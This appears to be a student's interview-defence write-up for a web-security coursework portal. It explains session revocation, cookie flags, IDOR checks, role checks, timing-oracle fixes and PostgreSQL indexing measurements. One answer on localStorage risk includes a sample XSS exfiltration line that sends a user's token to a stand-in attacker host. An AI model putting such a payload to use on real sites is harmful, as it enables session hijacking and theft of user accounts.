# Task 5 & Cross-Task Synthesis Interview Defence Answers (interview-answers.md)

All 20 Task 5 and cross-task synthesis questions answered directly and concisely (under 200 words each), referencing our exact Tekrise Academy codebase and empirical measurements across Tasks 1-5.

---

### 1. Why did you choose stateful database sessions over stateless JWTs for the Tekrise portal?
We chose stateful server-side sessions stored in public."Session" (src/lib/session.ts) over stateless JWTs because a student portal requires **immediate, deterministic session revocation**. A stateless JWT is self-contained and remains valid until its exp timestamp expires; if a Tekrise student leaves their session open on a shared Ring Road Ibadan campus computer or resets a compromised password, the server cannot invalidate an issued JWT without checking a database blocklist on every request (which reintroduces stateful storage anyway). With our Session table, deleting the row on logout (evidence/03-logout-replayed-cookie-rejected.txt) or password reset (evidence/05-sessions-after-reset.txt) kills the session across the entire portal in under 1 millisecond.

### 2. Why do you hash the session token with SHA-256 in the database when you prohibited SHA-256 for passwords in Task 4?
The choice of hashing algorithm depends entirely on the **input entropy**:
- **Passwords (Low Entropy -> Slow Argon2id):** Human-chosen passwords have low, predictable entropy and are vulnerable to offline dictionary attacks. In Task 4, we used Argon2id (64 MB RAM, 101.696 ms) to slow offline cracking down to 9.83 guesses/sec.
- **Session Tokens (256-Bit CSPRNG Entropy -> Fast SHA-256):** Our session token is generated via crypto.randomBytes(32), yielding 2^256 (1.15 x 10^77) equiprobable values. Brute-forcing a 256-bit random space is physically impossible regardless of hash speed. Hashing rawToken with SHA-256 (0.001140 ms) before storing it in Session.tokenHash ensures that even if an attacker steals a read-only database backup, they cannot extract raw cookie tokens to hijack active sessions, while keeping per-request auth checks sub-millisecond.

### 3. What does each cookie flag (HttpOnly, SameSite=Lax, Secure, Path=/) protect against?
In buildSessionCookieHeader() (src/lib/session.ts):
1. **HttpOnly:** Blocks client-side JavaScript (document.cookie) from reading the cookie, preventing Cross-Site Scripting (XSS) payloads from stealing the session token.
2. **SameSite=Lax:** Stops browsers from sending the cookie on cross-origin POST/DELETE requests initiated by malicious third-party sites (defending against Cross-Site Request Forgery / CSRF), while allowing top-level GET navigation links from verification emails.
3. **Secure:** Guarantees the cookie is only transmitted over encrypted HTTPS/TLS connections, preventing packet sniffing on shared Wi-Fi networks.
4. **Path=/ & Max-Age=604800:** Scopes the cookie to all portal routes and enforces a 7-day browser expiration matching Session.expiresAt.

### 4. Why is clearing the browser cookie on logout insufficient on its own?
Clearing the cookie via Set-Cookie: tekrise_session=; Max-Age=0 is merely an instruction asking the client browser to delete its local copy. If an attacker already intercepted the raw token (via a shared machine, proxy log, or malware) before logout—or if a non-browser client like curl ignores the Set-Cookie deletion header—the token remains completely valid unless the server deletes the backing record in PostgreSQL. In src/app/api/auth/logout/route.ts, we execute prisma.session.deleteMany({ where: { tokenHash } }), which is why replaying our captured cookie in evidence/03-logout-replayed-cookie-rejected.txt immediately failed with HTTP 401 Unauthorized.

### 5. Why must a password reset invalidate all existing sessions for that user?
Users reset their password for one of two reasons: they forgot it, or **they suspect their account has been compromised**. Because authenticated endpoints validate Session.tokenHash rather than re-checking Student.passwordHash on every request, updating Student.passwordHash alone leaves every existing logged-in session completely active for up to 7 days. In src/app/api/auth/reset/confirm/route.ts, we wrap verificationCode.update, student.update, and session.deleteMany({ where: { studentId } }) inside a single atomic prisma.$transaction(), reducing active sessions from 2 to 0 (evidence/04 and 05) and forcing every device to re-authenticate with the new password.

### 6. What is the difference between HTTP 401 Unauthorized and HTTP 403 Forbidden in your codebase?
- **HTTP 401 Unauthorized (Unauthenticated):** Returned when getAuthenticatedStudent() (src/lib/session.ts) finds no cookie, a tampered tokenHash, an expired session, or a revoked session (evidence/06-unauthenticated-401.txt). The server does not know who the caller is; signing in fixes a 401.
- **HTTP 403 Forbidden (Unauthorised):** Returned when authentication succeeded (the server verified the caller is adeleke.o@tekrise.ng), but the caller lacks permission for the target resource—either failing the **ownership check** on /api/student/receipts?studentId=... or failing the **REGISTRAR_ADMIN role check** on /api/admin/cohort-audit (evidence/07-wrong-user-or-role-403.txt).

### 7. What is an Insecure Direct Object Reference (IDOR), and how did you prevent it in /api/student/receipts?
An IDOR (Horizontal Privilege Escalation) occurs when an application checks that a user is logged in, takes a record identifier from the URL or body (such as ?studentId=...), and queries the database without verifying that the logged-in user actually owns that record. In src/app/api/student/receipts/route.ts (Lines 23-36), we compare requestedStudentId against authContext.student.id from the verified server session. When adeleke.o@tekrise.ng requested funmilayo.bakare@tekrise.ng's tuition receipts in evidence/07-wrong-user-or-role-403.txt, the server blocked the query with HTTP 403 Forbidden.

### 8. Why can role checks never rely on a role field sent from the client request body or non-HttpOnly state?
Any header, query parameter, localStorage value, or JSON field originating from the client can be trivially edited in Chrome DevTools or forged via curl (e.g., passing "role": "REGISTRAR_ADMIN"). In src/app/api/admin/cohort-audit/route.ts, the server ignores client claims and reads authContext.student.role directly from the PostgreSQL Student row joined via the SHA-256 verified Session.tokenHash. Because the Student.role column can only be mutated by privileged database operations, a student cannot escalate their own role.

### 9. Walk through the exact numbers from your EXPLAIN ANALYZE experiment before and after indexing.
On our 30,000-row public."TuitionPaymentAttempt" table (docs/indexing.md):
1. **Before Indexing (evidence/08-explain-before-index.txt):** Running SELECT ... WHERE "studentEmail" = 'bursary.target.15000@tekrise.ng' forced PostgreSQL into a **Seq Scan**, reading all 30,000 rows, discarding 29,999 rows (Rows Removed by Filter: 29999), and taking **2.545 ms**.
2. **After Indexing (evidence/09-explain-after-index.txt):** After creating B-Tree index TuitionPaymentAttempt_studentEmail_idx, PostgreSQL switched to an **Index Scan**, traversing the B-Tree directly to the single matching row (Buffers: shared hit=4) in **0.043 ms**.
3. **Result:** A **59.2x query speedup** (2.545 ms -> 0.043 ms).

### 10. What is the difference between EXPLAIN and EXPLAIN (ANALYZE, BUFFERS) in PostgreSQL?
- **EXPLAIN:** Only asks the PostgreSQL query planner to *estimate* the execution plan and relative cost units based on table statistics in pg_statistic without actually running the SQL query.
- **EXPLAIN (ANALYZE, BUFFERS):** Actually executes the query against the database engine and reports the true wall-clock execution time (in milliseconds), the exact actual rows vs. estimated rows at each node, and the exact number of 8 KB shared memory/disk buffer blocks read or dirtied (shared hit=4).

### 11. When will the PostgreSQL query planner deliberately ignore a B-Tree index and choose a Sequential Scan anyway?
PostgreSQL's cost-based optimizer will deliberately ignore a valid B-Tree index and choose a Seq Scan in two common cases:
1. **Tiny Tables:** If a table has only 20 rows fitting inside a single 8 KB heap page, reading that 1 page sequentially is faster than reading an index page plus the heap page.
2. **Low Selectivity / Low Cardinality Queries:** If a query matches a large fraction of the table (e.g., WHERE status = 'FAILED' matching 35% of rows), jumping back and forth between the B-Tree index and random heap pages causes expensive random I/O, whereas a sequential scan sweeps contiguous disk pages cleanly.

### 12. What is the write cost of adding an index, and how did that shape your schema design?
Every B-Tree index is an additional physical data structure on disk that must stay sorted and balanced. On every INSERT, UPDATE (of an indexed column), or DELETE, PostgreSQL must traverse and update the heap table *plus* every index on that table, increasing CPU work, page splits, and Write-Ahead Log (WAL) I/O. In our schema (task-04-server-security/docs/schema.md), we indexed high-selectivity lookup columns (email, matricPin, tokenHash, studentEmail) while leaving write-heavy descriptive columns (userAgent, failureReason, content) unindexed.

### 13. How did you fix the login timing-oracle user enumeration defect from Task 4?
In Task 4 (docs/defects.md, Defect 3), logging in with an unknown email returned HTTP 401 in ~5 ms (right after prisma.student.findUnique returned null), whereas logging in with a valid email and wrong password ran Argon2id (m=64MB, t=3) and took ~101.696 ms—allowing an attacker to enumerate valid student emails by measuring response latency. In Task 5 (src/app/api/auth/login/route.ts, Lines 46-52), when !student is true, we now execute await verifyPassword(DUMMY_ARGON2ID_HASH, password) before returning 401, equalizing both execution paths to ~101.696 ms.

### 14. Trace a single student registration and login request from Task 1 UI tokens through Task 5 session issuance.
1. **Task 1 & 2 (UI & Route Architecture):** The student loads /auth?mode=signup styled with our Task 1 tokens (#006D35, Plus Jakarta Sans) and switches modes via URL query state (?mode=).
2. **Task 3 (Client Validation):** React validates all 8 rules on blur, sets aria-invalid, and unlocks the submit button.
3. **Task 4 (Server Boundary Security):** POST /api/enquiries checks the IP rate limiter, validates/normalises via Zod, screens the password against HIBP k-anonymity, hashes with Argon2id (101.696 ms), writes Student + VerificationCode, and dispatches the branded OTP email via setImmediate (532 ms vs 2368 ms sync).
4. **Task 5 (Session & Auth):** On POST /api/auth/login, Argon2id verifies the password, SHA-256(rawToken) is saved to Session, and an HttpOnly cookie is issued.

### 15. Why did we build both client-side validation in Task 3 and server-side Zod validation in Task 4?
They serve two completely different purposes:
- **Client-Side Validation (Task 3) is for User Experience & Accessibility:** It gives honest Tekrise students immediate, zero-latency inline feedback on blur and announces field errors to VoiceOver via aria-describedby without waiting for an HTTP round-trip. It provides **zero security**, as proven when our Task 3 curl attack bypassed the browser and inserted "fullName": "a" into PostgreSQL.
- **Server-Side Validation (Task 4) is for Security & Data Integrity:** Placed at the API boundary (src/lib/server-schemas.ts), it rejects malformed or malicious payloads from any client (browser, curl, Postman, botnet) with HTTP 400 (evidence/12-direct-request-before-and-after.txt).

### 16. How do your database foreign-key onDelete rules (Cascade vs Restrict) protect the Tekrise portal?
In prisma/schema.prisma, we deliberately chose different referential integrity actions based on domain semantics:
- **onDelete: Cascade on Session and VerificationCode:** Ephemeral authentication artifacts have no meaning if a Student row is deleted; cascading cleans up orphaned sessions and OTPs automatically.
- **onDelete: Restrict on TuitionPayment and TuitionPaymentAttempt:** Financial ledgers and tax audit records must **never** be wiped out if an administrator accidentally attempts to delete a Student profile. Restrict forces PostgreSQL to abort any student deletion if payment history exists.

### 17. Compare the three timing experiments you ran across Task 4 and Task 5 (exact machine numbers).
Across our MacBook Pro benchmarks, we proved that speed is desirable in two places and dangerous in one:
1. **Password Hashing (Task 4, evidence/08 — Slow is Right):** Argon2id took **101.696 ms** (9.83 guesses/sec) vs. SHA-256 at **0.001140 ms** (877,129 guesses/sec)—a **89,201x slowdown** that stops offline password cracking.
2. **Email Dispatch (Task 4, evidence/18 — Fast HTTP Response is Right):** Moving SMTP dispatch from synchronous blocking (**2368 ms**) to a background job (**532 ms**) cut registration wait time by **1836 ms**.
3. **Database Indexing (Task 5, evidence/08 & 09 — Fast Lookup is Right):** Adding a B-Tree index on 30,000 rows cut SELECT latency from **2.545 ms** (Seq Scan) to **0.043 ms** (Index Scan)—a **59.2x speedup**.

### 18. Wrong-answer analysis: "We store the user's JWT in localStorage and attach it in an Authorization: Bearer header from React. That way we are completely immune to CSRF, and on logout we just call localStorage.removeItem('token')."
1. **Complete Exposure to XSS Token Theft:** Unlike an HttpOnly cookie (which JavaScript cannot read), localStorage is readable by any JavaScript running on the origin. A single XSS flaw—in application code, a markdown renderer, or a compromised npm package—allows an attacker to run fetch("https://evil.tld?t=" + localStorage.getItem("token")) and exfiltrate every user's token silently.
2. **Fake Logout (Zero Server Revocation):** Calling localStorage.removeItem('token') only deletes the string from that one browser tab. The stateless JWT itself remains 100% valid on the server until it expires; anyone who copied the token before logout can continue calling the API via curl unrestricted.

### 19. Wrong-answer analysis: "To speed up our database, we added B-Tree indexes to every column on every table, and we use a single global admin API key in our Next.js client bundle to query routes faster."
1. **Indexing Every Column Destroys Write Performance & RAM:** Every INSERT or UPDATE must now update a dozen B-Tree indexes per table, multiplying WAL disk I/O and polluting PostgreSQL's shared_buffers cache with useless low-cardinality indexes (like booleans) that the planner will never use.
2. **Putting an Admin Key in the Client Bundle Gives Every User Root Access:** Anything prefixed with NEXT_PUBLIC_ or bundled into client JavaScript is downloaded in plaintext to every user's browser. Any visitor can open DevTools, copy the global admin key, and execute privileged admin mutations via curl, bypassing per-user session authorisation entirely.

### 20. Looking at your complete Tekrise Academy portal across Tasks 1-5, what is the single highest-priority architectural upgrade you would ship before taking real tuition money in production?
Before processing live Naira tuition settlements in production, our #1 priority upgrade is **replacing in-process volatile state (Map rate limiting in src/lib/rate-limit.ts and setImmediate email dispatch in src/app/api/enquiries/route.ts) with a durable Redis + BullMQ infrastructure layer, paired with removing demoVerificationCode from the HTTP response**:
1. Removing demoVerificationCode (Task 4 Defect 1) and adding a 5-attempt lockout on /api/auth/reset/confirm (Task 5 Defect 2) closes immediate account-takeover vectors.
2. Moving rate-limit buckets to shared Redis with composite IP + email keys prevents proxy-rotation bypasses (Task 4 evidence/14) and OOM heap leaks across serverless instances.
